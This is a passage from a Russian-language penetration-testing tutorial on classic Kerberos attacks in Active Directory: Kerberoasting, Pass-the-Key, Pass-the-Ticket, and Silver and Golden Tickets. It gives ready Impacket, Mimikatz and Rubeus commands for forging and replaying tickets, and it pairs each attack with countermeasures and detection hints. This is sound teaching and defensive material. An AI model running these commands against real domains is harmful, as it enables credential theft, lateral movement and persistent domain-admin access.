</span></span></code></pre></div><blockquote><p>Для выполнения целевого Kerberoasting в отношении конкретной учетной записи смотри справку <em><a href=https://github.com/ShutdownRepo/targetedKerberoast>targetedKerberoast.py</a></em></p></blockquote><p><strong>Рекомендация по противодействию Kerberoasting</strong>:</p><ul><li>Установить для сервисных учетных записей несловарные пароли длинной от 20 символов</li><li>Использовать защищенный канал между клиентом и контроллером домена для обмена KRB-сообщениями (Flexible Authentication Secure Tunneling или Kerberos armoring).</li><li>Использовать групповые учетные записи служб (Group Managed Service Accounts, gMSA) в качестве сервисных учетных записей.</li><li>Создать &ldquo;ложную&rdquo; сервисную учетную запись, обладающую SPN, но не имеющую отношения ни к какому приложению. В дальнейшем необходимо отслеживать попытки запроса TGS к указанной службе. <a href=https://github.com/whoamins/SPN-Honeypot>Пример</a> для вдохновения.</li><li>Руководствоваться принципом минимальных привилегий в отношении сервисных учетных записей. В частности, не наделять сервисные учетные записи правами уровня администратора домена. Удалить неиспользуемые SPN.</li><li>Отслеживать аномальные <em>KRB_TGS_REQ</em> запросы с использованием системы анализа трафика.</li><li>Отключить слабые типы шифрования Kerberos.</li><li>С использованием межсетевых экранов ограничить доступ к KDC для сетевых объектов, не входящих в белый список.</li></ul><p>Для самостоятельной тренировки Kerberoasting есть стенд Active на HackTheBox.</p><p>Источники:</p><ul><li>Хорошая <a href=https://habr.com/ru/post/650889/>статья</a> про Kerberoasting на русском языке. Там же можно подробнее прочитать про реализацию рекомендаций на практике.</li></ul><p>Для дальнейшего углубленного изучения:</p><ul><li><a href=https://m365internals.com/2021/11/08/kerberoast-with-opsec/>Статья</a>, в которой рассматриваются типовые ошибки Red Team при Kerberoasting, а также способы остаться незамеченным.</li></ul><h3 id=pass-the-key--overpass-the-hash>Pass-the-key / Overpass The Hash<a hidden class=anchor aria-hidden=true href=#pass-the-key--overpass-the-hash>#</a></h3><p><strong>Условие для проведения атаки</strong>: наличие ключа пользователя.</p><p><strong>Варианты выполнения условия</strong>:</p><ul><li>Извлечь ключи из памяти скомпрометированной рабочей станции (требуются права администратора)</li></ul><p><strong>Результат успешной атаки</strong>: дальнейшее продвижение с правами скомпрометированной учетной записи.</p><p>Предположим атакующий получил доступ с правами администратора в отношении одной из доменных рабочих станций. Дальше, как правило, возникает задача сбора аутентификационных данных для последующего доступа к другим объектам домена.</p><blockquote><p>Наличие доступа с правами администратора по умолчанию означает, что вы можете сделать на рабочей станции всё, что заблагорассудиться. В теории никакие средства защиты не помещают извлечь необходимые сведения, например из памяти процесса LSASS. Обход средств защиты выходит за рамки настоящей статьи.</p></blockquote><p>В результате извлечения аутентификационных данных атакующий может добыть ключ пользователя, используемый для запроса TGT у контроллера домена. Далее с использованием добытого ключа атакующий получает TGT, а вместе с ним и доступ к объектам домена.</p><p>Ключ может иметь различный вид в зависимости от настроек Kerberos (<a href=/posts/kerberos_theory/#%D0%B0%D0%BB%D0%B3%D0%BE%D1%80%D0%B8%D1%82%D0%BC-%D1%84%D0%BE%D1%80%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-%D0%BA%D0%BB%D1%8E%D1%87%D0%B0>см.ранее</a>). При использовании алгоритма RC4_HMAC_MD5 ключом будет являться NT хэш пароля пользователя. В таком случае атака повторного воспроизведения указанного хэша в Kerberos является подвидом атаки Pass-the-Key и называется Overpass-The-Hash.</p><p>Когда целесообразен Pass-the-Key? Допустим в организации отключена аутентификация с использованием NTLM и Kerberos c RC4_HMAC_MD5. На практике подобное маловероятно, но в отношении ряда объектов вполне может встретиться. Тогда знание, AES-ключа все равно позволит получить необходимый доступ без знания пароля.</p><p><strong>Команды для выполнения атаки</strong>:</p><p>При наличии NT-хэша (Overpass-the-Hash)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>getTGT.py -hashes <span class=nv>$LM</span>:<span class=nv>$NT</span> <span class=nv>$Domain_FQDN</span>/<span class=nv>$username</span>@<span class=nv>$target</span>
</span></span></code></pre></div><p>При наличии ключа, сформированного по AES-алгоритмам</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>getTGT.py -aesKey <span class=nv>$KerberosKey</span> <span class=nv>$Domain_FQDN</span>/<span class=nv>$username</span>@<span class=nv>$target</span>
</span></span></code></pre></div><p><em>Рекомендации по противодействию Overpass-the-hash</em>:</p><ul><li>Исключить использование RC4_HMAC_MD5 в Kerberos. В случае невозможности отключения отслеживать аномальные запросы с использованием указанного алгоритма шифрования.</li></ul><p><em>Рекомендации по противодействию Pass-the-key</em>:</p><ul><li>При распределении привилегированного доступа руководствоваться многоуровневой моделью Microsoft. Использовать для администрирования некритичных объектов домена выделенные учетные записи с ограниченными правами. Не использовать административные учетные записи для доступа к рядовым ресурсам.</li><li>Ограничить входящие соединения на межсетевом экране для каждого конечного сетевого объекта, в первую очередь для серверов.</li><li>Использовать Credential Guard для защиты процесса lsass.exe и противодействия извлечению аутентификационных данных на объектах сети функционирующих под управлением ОС семейства Windows.</li><li>Ограничить входящие соединения на межсетевом экране каждого конечного узла.</li></ul><p>Для дальнейшего углубленного изучения:</p><ul><li><a href=https://blog.harmj0y.net/redteaming/kerberoasting-revisited/>Исследование</a> <a href=https://twitter.com/harmj0y>harmj0y</a> о возможном понижении версии алгоритма формирования ключа (AES -> RC4)</li></ul><h3 id=pass-the-ticket-ptt--pass-the-cache>Pass-the-Ticket (PtT) / Pass-the-Cache<a hidden class=anchor aria-hidden=true href=#pass-the-ticket-ptt--pass-the-cache>#</a></h3><p><strong>Условие для проведения атаки</strong>: наличие TGT или TGS билетов.</p><p><strong>Варианты выполнения условия</strong>:</p><ul><li>Извлечь билеты из скомпрометированной рабочей станции при наличии прав администратора</li><li>Извлечь билеты из резервной копии рабочей станции (без прав администратора)</li><li>Извлечь из рабочей станции билеты только скомпрометированного пользователя (без прав администратора)</li><li>Сформировать на своей рабочей станции самостоятельно при наличии соответствующих аутентификационных данных</li></ul><p><strong>Результат успешной атаки</strong>: дальнейшее продвижение с правами скомпрометированной учетной записи.</p><p>Прежде чем приступить к разбору атаки рассмотрим, как хранятся билеты Kerberos в различных операционных системах.</p><p>В Linux для хранения Kerberos используется формат ccache (от credential cache). Сами билеты могут быть обнаружены в:</p><ul><li>в директории /tmp в файлах с именем, имеющим вид: <em>krb5cc_%{uid}</em></li><li>в памяти ядра, специально предназначенной для хранения ключей (kernel keyrings)</li><li>в памяти пользовательского процесса</li></ul><p>В Windows билеты Kerberos хранятся в памяти процесса lsass в формате kirbi. Просмотреть доступные текущему пользователю билеты можно следующим образом:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>Ivan</span><span class=p>&gt;</span> <span class=n>klist</span>
</span></span></code></pre></div><p>Конвертировать билеты в необходимый формат можно следующим образом:</p><p>kirbi -> ccache (Windows -> Linux)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>ticketConverter</span><span class=o>.</span><span class=n>py</span> <span class=err>$</span><span class=n>ticket</span><span class=o>.</span><span class=n>kirbi</span> <span class=err>$</span><span class=n>ticket</span><span class=o>.</span><span class=n>ccache</span>
</span></span></code></pre></div><p>ccache -> kirbi (Linux -> Windows)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>ticketConverter</span><span class=o>.</span><span class=n>py</span> <span class=err>$</span><span class=n>ticket</span><span class=o>.</span><span class=n>ccache</span> <span class=err>$</span><span class=n>ticket</span><span class=o>.</span><span class=n>kirbi</span>
</span></span></code></pre></div><p><strong>Команды для выполнения атаки</strong>:</p><p>В Linux:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>path_to_ticket.ccache
</span></span></code></pre></div><p>В Windows при помощи Mimikatz:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>kerberos::ptt path_to_ticket.kirbi
</span></span></code></pre></div><p>В Mimikatz можно также использовать ccache формат:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>kerberos::ptt path_to_ticket.ccache
</span></span></code></pre></div><p>В Windows при помощи Rubeus:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>Rubeus.exe ptt /ticket:<span class=s2>&#34;base64 | file.kirbi&#34;</span>
</span></span></code></pre></div><p>В Linux для использования загруженных билетов в поддерживающих Kerberos инструментах необходимо указать соответствующие ключи (как правило: <em>-no-pass / -k</em>).</p><p>О каких инструментах идет речь? В первую очередь об утилитах, входящих в состав Impacket, и <a href=https://github.com/Porchetta-Industries/CrackMapExec>crackmapexec</a>.</p><p>Пример:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>psexec.py -k <span class=nv>$Domain_FQDN</span>/<span class=nv>$username</span>@<span class=nv>$target</span>
</span></span></code></pre></div><p>В Windows после загрузки в lsass билет будет использоваться по умолчанию.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>.\PsExec.exe -accepteula \\<span class=p>&lt;</span>target<span class=p>&gt;</span> cmd
</span></span></code></pre></div><h3 id=ptt--anyspn>PtT + AnySPN<a hidden class=anchor aria-hidden=true href=#ptt--anyspn>#</a></h3><p>Очевидно, что больше возможностей для дальнейшего продвижения предоставляет именно TGT, ведь TGS билет используется для доступа только к одному определенному сервису.</p><p>Это действительно так, но еще раз обратимся к атаке <a href=#kerberoasting--anyspn>AnySPN</a>. В ходе Pass-the-Key возможно подменить SPN в TGS-билете и использовать модифицированный TGS-билет для доступа к другому сервису, принадлежащему той же учетной записи.</p><p><img src=images/NO_SPN_THK.png alt=PTK_no_spn>
(скриншот взят <a href=https://swarm.ptsecurity.com/kerberoasting-without-spns/>отсюда</a>)</p><p><strong>Рекомендации по противодействию Pass-the-Ticket</strong>:</p><ul><li>При распределении привилегированного доступа руководствоваться многоуровневой моделью Microsoft. Использовать для администрирования некритичных объектов домена выделенные учетные записи с ограниченными правами. Не использовать административные учетные записи для доступа к рядовым ресурсам.</li><li>Ограничить входящие соединения на межсетевом экране для каждого конечного сетевого объекта, в первую очередь для серверов.</li><li>Использовать Credential Guard для защиты процесса lsass.exe и противодействия извлечению аутентификационных данных на объектах сети функционирующих под управлением ОС семейства Windows.</li><li>Ограничить входящие соединения на межсетевом экране каждого конечного узла.</li></ul><p><strong>Источники литературы</strong>:</p><ul><li><a href=https://www.tarlogic.com/blog/how-to-attack-kerberos/#Pass_The_Ticket_PTT>Kerberos (II): How to attack Kerberos?</a> (Eloy Pérez)</li></ul><h3 id=silver-ticket>Silver Ticket<a hidden class=anchor aria-hidden=true href=#silver-ticket>#</a></h3><p><strong>Условие для проведения атаки</strong>: наличие ключа сервиса.</p><p><strong>Некоторые варианты выполнения условия</strong>:</p><ul><li>Kerberoasting</li><li>Извлечь ключ из памяти процесса lsass.exe скомпрометированной рабочей станции (требуются права администратора)</li><li>В результате перебора по радужным таблицам после понижение NTLMv2 -> NTLMv1 (права администратора не требуются)</li></ul><p><strong>Результат успешной атаки</strong>: закрепление возможности доступа к скомпрометированному сервису с правами уровня администратора домена.</p><p>При наличии ключа сервиса атакующий может самостоятельно сформировать TGS-билет для доступа к указанному сервису. Действительно, как было рассмотрено ранее [<a href=#krb_ap_req>1</a>][<a href=#logon>2</a>], для составления TGS-билета требуется:</p><ol><li>Составить произвольный <a href=#krb_as_rep-ad>PAC</a></li><li>Подписать PAC ключом сервиса</li><li>Придумать свой собственный сессионный ключ</li><li>Указать корректное время и период действия билета</li><li>Зашифровать получившиеся данные из пунктов 1-4 ключом сервиса</li><li>Составить аутентификатор от имени произвольного пользователя</li><li>Зашифровать аутентификатор придуманным сессионным ключом</li></ol><p>На этом атака Silver Ticket по сути и заканчивается. Далее с использованием атаки Pass-the-Ticket атакующий обращается к скомпрометированному сервису. Что будет происходить на стороне сервиса при получении созданного лже TGS-билета:</p><ol><li>Сервис при помощи своего ключа расшифровывает TGS-билет. Отправитель становится доверенным, так как он смог предоставить TGS-билет, который в теории может быть выдан только контроллером домена. Но в теории теория и практика не отличаются, а на практике они расходятся.</li><li>Сервис проверяет свою подпись PAC.</li><li>Сервис извлекает сессионный ключ и с его помощью расшифровывает аутентификатор.</li><li>Сервис предоставляет пользователю из аутентификатора доступ к себе с правами указанными в PAC.</li></ol><p>Теперь могут возникнуть вопросы, которые хочется сразу же обсудить:</p><p>- В PAC действительно можно указать произвольные данные?<br>- Да, например можно указать, что пользователь состоит в группе администраторов домена.</p><p>- Погодите, PAC подписывается два раза. Один раз сервис, один раз контроллер домена. Как быть с подписью krbtgt?<br>- Никак. По умолчанию сервис не отправляет полученный TGS-билет на контроллер домена для проверки подписи. Таким образом даже после смены секрета учетной записи krbtgt атакующий сохранит доступ к сервису.</p><p><strong>Команды для выполнения атаки в Linux</strong>:</p><p>С использованием RC4 ключа (NT-хэша):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>ticketer</span><span class=o>.</span><span class=n>py</span> <span class=o>-</span><span class=n>nthash</span> <span class=err>$</span><span class=n>NThash</span> <span class=o>-</span><span class=n>domain</span><span class=o>-</span><span class=n>sid</span> <span class=err>$</span><span class=n>DomainSID</span> <span class=o>-</span><span class=n>domain</span> <span class=err>$</span><span class=n>DOMAIN</span> <span class=o>-</span><span class=n>spn</span> <span class=err>$</span><span class=n>SPN</span> <span class=err>$</span><span class=n>Username</span>
</span></span></code></pre></div><p>spn - имя сервиса для которого формируется TGS-билет
username - имя произвольной, но реальной учетной записи домена
domain-sid - идентификатор безопасности домена, который можно узнать при помощи следующей команды:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>lookupsid</span><span class=o>.</span><span class=n>py</span> <span class=o>-</span><span class=n>hashes</span> <span class=s1>&#39;LMhash:NThash&#39;</span> <span class=s1>&#39;DOMAIN/DomainUser@DomainController&#39;</span> <span class=mi>0</span>
</span></span></code></pre></div><p>С использованием AES ключа:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>ticketer</span><span class=o>.</span><span class=n>py</span> <span class=o>-</span><span class=n>aesKey</span> <span class=err>$</span><span class=n>AESkey</span> <span class=o>-</span><span class=n>domain</span><span class=o>-</span><span class=n>sid</span> <span class=err>$</span><span class=n>DomainSID</span> <span class=o>-</span><span class=n>domain</span> <span class=err>$</span><span class=n>DOMAIN</span> <span class=o>-</span><span class=n>spn</span> <span class=err>$</span><span class=n>SPN</span> <span class=err>$</span><span class=n>Username</span>
</span></span></code></pre></div><p><strong>Команды для выполнения атаки в Windows</strong>:</p><p>С использованием RC4 ключа (NT-хэша) в Mimikatz:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
</span></span></code></pre></div><p>С использованием AES128 ключа в Mimikatz:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
</span></span></code></pre></div><p>С использованием AES256 ключа в Mimikatz:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>kerberos::golden /domain:<span class=nv>$DOMAIN</span> /sid:<span class=nv>$DomainSID</span> /aes256:<span class=nv>$krbtgt_aes256_key</span> /user:<span class=nv>$username_to_impersonate</span> /target:<span class=nv>$targetFQDN</span> /service:<span class=nv>$spn_type</span> /ptt
</span></span></code></pre></div><blockquote><p>Примечание: Mimikatz и Ticketer по умолчанию указывают в PAC, что пользователь состоит в административных группах с предопределенными идентификаторами (513, 512, 520, 518, 519). Крайне редко права доступа могут быть нарезаны только для специфической группы и членства в группе администраторов домена будет недостаточно. Тогда при желании более точно сформировать PAC можно воспользоваться утилитой <a href=https://github.com/Dramelac/GoldenCopy>GoldenCopy</a>.</p></blockquote><p>Также хочется отметить некоторые особенности, которые могут выдать Silver Ticket. Это может пригодится Red и Blue Team.</p><ol><li>В ходе Silver Ticket отсутствует взаимодействие с контроллером домена, то есть атакующий не использует TGT для запроса TGS. Билет появляется из ниоткуда, а это можно отследить в результате анализа логов.</li><li>Использование алгоритма шифрования RC4 может быть рассмотрено, как аномальное. По умолчанию для рабочих станций используется AES256.</li><li>Запрос билета с большим временем жизни также может быть рассмотрен, как аномальное поведение.</li></ol><p><em>Рекомендация по противодействию Silver Ticket</em>:</p><ul><li>Использовать проверку подлинности PAC</li></ul><p>Ссылки:</p><ul><li><a href=https://en.hackndo.com/kerberos-silver-golden-tickets/>hackndo</a></li><li><a href=https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets>hacker recipes</a></li></ul><p>Материалы для дальнейшего изучения:</p><ul><li><a href=https://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html>Статья</a> про проверку PAC</li></ul><h3 id=golden-ticket>Golden Ticket<a hidden class=anchor aria-hidden=true href=#golden-ticket>#</a></h3><p><strong>Условие для проведения атаки</strong>: наличие ключа учетной записи <em>krbtgt</em>.</p><p><strong>Некоторые варианты выполнения условия</strong>:</p><ul><li>Атака DCsync</li></ul><p><strong>Результат успешной атаки</strong>: закрепление возможности доступа к скомпрометированному домену.</p><p>Наличие ключа учетной записи <em>krbtgt</em> позволяет атакующему формировать и изменять TGT по своему усмотрению. Таким образом возможно составить произвольный PAC для любого пользователя домена и получить от его имени доступ к необходимому сервису с желаемыми правами.</p><p><strong>Команды для выполнения атаки в Linux</strong>:</p><p>С использованием RC4 ключа (NT-хэша):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>ticketer.py -nthash <span class=nv>$krbtgtNThash</span> -domain-sid <span class=nv>$domainSID</span> -domain <span class=nv>$Domain</span> <span class=nv>$RandomUser</span>
</span></span></code></pre></div><p>С использованием AES ключа:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>ticketer.py -aesKey <span class=nv>$krbtgtAESkey</span> -domain-sid <span class=nv>$DomainSID</span> -domain <span class=nv>$Domain</span> <span class=nv>$RandomUser</span>
</span></span></code></pre></div><p>C указанием идентификаторов групп:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>ticketer.py -nthash <span class=nv>$krbtgtNThash</span> -domain-sid <span class=nv>$DomainSID</span> -domain <span class=nv>$Domain</span> -user-id <span class=nv>$UserID</span> -groups <span class=nv>$GroupID1</span>,<span class=nv>$GroupID2</span>, ... <span class=nv>$RandomUser</span>
</span></span></code></pre></div><p><strong>Команды для выполнения атаки в Windows</strong>:</p><p>С использованием RC4 ключа (NT-хэша) в Mimikatz:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>kerberos::golden /domain:<span class=nv>$Domain</span> /sid:<span class=nv>$DomainSID</span> /rc4:<span class=nv>$krbtgt_NThash</span> /user:<span class=nv>$RandomUser</span> /ptt
</span></span></code></pre></div><p>С использованием AES128 ключа в Mimikatz:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>kerberos::golden /domain:<span class=nv>$Domain</span> /sid:<span class=nv>$DomainSID</span> /aes128:<span class=nv>$krbtgt_aes128_key</span> /user:<span class=nv>$RandomUser</span> /ptt
</span></span></code></pre></div><p>С использованием AES256 ключа в Mimikatz:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>kerberos::golden /domain:<span class=nv>$Domain</span> /sid:<span class=nv>$DomainSID</span> /aes256:<span class=nv>$krbtgt_aes256_key</span> /user:<span class=nv>$RandomUser</span> /ptt
</span></span></code></pre></div><h2 id=заключение>Заключение<a hidden class=anchor aria-hidden=true href=#заключение>#</a></h2><p>На этом рассмотрение классических атак на протокол Kerberos считаю оконченным. В итоге были разобраны основные моменты, рекомендации по противодействию и особенности проведения указанных атак. Надеюсь, что настоящий материал поможет более глубоко и детально разобраться в механизмах атак на протокол Kerberos в Active Directory.</p><p>К сожалению нельзя объять необъятное. Некоторые важные и актуальные темы, например связанные с делегированием, не были затронуты. Также не описывались атаки, создающие условия для дальнейшего проведения атак на Kerberos. Все это возможно будет рассказано позже.</p><h3 id=ссылки>Ссылки<a hidden class=anchor aria-hidden=true href=#ссылки>#</a></h3><p>Общие источники из которых черпал информацию по атакам на Kerberos</p><ul><li>Монументальный <a href=https://www.tarlogic.com/blog/how-to-attack-kerberos>труд</a> Eloy Pérez</li><li>Комплексная <a href=https://habr.com/ru/company/jetinfosystems/blog/449278/>статья</a> Сергея Ефимова</li><li>&ldquo;Разбираем атаки на Kerberos с помощью Rubeus&rdquo;. Части <a href=https://tomhunter.ru/press-center/publications/razbiraem-ataki-na-kerberos-s-rubeus.html>1</a> и <a href=https://tomhunter.ru/press-center/publications/rubeus_chast_2.html>2</a> компании T.Hunter</li><li><a href=https://swarm.ptsecurity.com/kerberoasting-without-spns/>Kerberoasting without SPN</a> от Арсения Шароглазова</li></ul><p>Полезные блоги для дальнейшего изучения, в том числе отличных от Kerberos, атак на Active Directory:</p><ul><li><a href=https://blog.harmj0y.net/blog/>Блог</a> Will Schroeder (harmj0y)</li><li><a href=https://www.thehacker.recipes>Блог</a> Charlie Bromberg (Shutdown)</li><li><a href=https://en.hackndo.com/>Блог</a> Pixis</li></ul><p>Картинки:</p><ul><li>Матрешки взяты <a href=https://www.livemaster.ru/item/44814920-russkij-stil-matreshka-naryadnye-krasavitsy-komplekt-iz-3-h-m>отсюда</a></li><li>Скриншот экрана входа <a href=https://windowsnotes.ru/windows-10/bystroe-pereklyuchenie-polzovatelej-v-windows-10/>отсюда</a></li><li>Цербер <a href=https://funart.pro/41114-cerber-schenok-28-foto.html>отсюда</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://ardent101.github.com/tags/active-directory/>Active Directory</a></li><li><a href=https://ardent101.github.com/tags/kerberos/>Kerberos</a></li><li><a href=https://ardent101.github.com/tags/pentest/>Pentest</a></li><li><a href=https://ardent101.github.com/tags/%D1%82%D0%B5%D0%BE%D1%80%D0%B8%D1%8F/>Теория</a></li><li><a href=https://ardent101.github.com/tags/%D1%80%D0%B5%D0%BA%D0%BE%D0%BC%D0%B5%D0%BD%D0%B4%D0%B0%D1%86%D0%B8%D0%B8/>Рекомендации</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки. on twitter" href="https://twitter.com/intent/tweet/?text=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%202.%20%d0%9a%d0%bb%d0%b0%d1%81%d1%81%d0%b8%d1%87%d0%b5%d1%81%d0%ba%d0%b8%d0%b5%20%d0%b0%d1%82%d0%b0%d0%ba%d0%b8.&url=https%3a%2f%2fardent101.github.com%2fposts%2fkerberos_general_attacks%2f&hashtags=ActiveDirectory%2cKerberos%2cPentest%2c%d0%a2%d0%b5%d0%be%d1%80%d0%b8%d1%8f%2c%d0%a0%d0%b5%d0%ba%d0%be%d0%bc%d0%b5%d0%bd%d0%b4%d0%b0%d1%86%d0%b8%d0%b8"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки. on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fardent101.github.com%2fposts%2fkerberos_general_attacks%2f&title=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%202.%20%d0%9a%d0%bb%d0%b0%d1%81%d1%81%d0%b8%d1%87%d0%b5%d1%81%d0%ba%d0%b8%d0%b5%20%d0%b0%d1%82%d0%b0%d0%ba%d0%b8.&summary=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%202.%20%d0%9a%d0%bb%d0%b0%d1%81%d1%81%d0%b8%d1%87%d0%b5%d1%81%d0%ba%d0%b8%d0%b5%20%d0%b0%d1%82%d0%b0%d0%ba%d0%b8.&source=https%3a%2f%2fardent101.github.com%2fposts%2fkerberos_general_attacks%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 2. Классические атаки. on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fardent101.github.com%2fposts%2fkerberos_general_attacks%2f&title=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%202.%20%d0%9a%d0%bb%d0%b0%d1%81%d1%81%d0%b8%d1%87%d0%b5%d1%81%d0%ba%d0%b8%d0%b5%20%d0%b0%d1%82%d0%b0%d0%ba%d0%b8."><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 